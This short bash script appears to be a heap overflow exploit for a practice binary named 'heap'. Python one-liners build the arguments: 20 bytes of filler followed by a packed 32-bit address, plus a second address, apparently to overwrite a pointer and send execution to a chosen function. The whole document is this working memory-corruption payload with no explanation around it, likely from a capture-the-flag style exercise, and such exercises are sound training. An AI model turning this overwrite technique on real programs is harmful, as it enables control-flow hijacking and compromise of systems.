#!/usr/bin/env bash

./heap $(python -c "print 'aaaabbbbccccddddeeee' + '\x1c\xa0\x04\x08'") $(python -c "print '\xcb\x84\x04\x08'")
